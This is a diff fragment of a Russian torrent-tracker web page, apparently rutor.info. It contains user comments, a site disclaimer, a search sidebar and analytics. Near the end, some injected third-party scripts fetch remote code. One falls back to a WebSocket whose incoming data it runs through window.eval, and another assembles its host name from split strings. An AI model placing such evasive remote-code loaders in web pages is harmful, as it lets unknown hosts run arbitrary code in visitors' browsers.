+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>Walkin*</b></td> <td>31-12-2017 23:50:02 (4 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3124715"></span><script type="text/javascript">cOptions(1521621,3124715);</script></td></tr><tr><td class="c_t" colspan=4>За оpen мatte +++</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>:Blud:</b></td> <td>30-12-2017 21:09:41 (4 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3124138"></span><script type="text/javascript">cOptions(1521454,3124138);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо!<img src="http://s.rutor.info/t/smilies/respect1.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
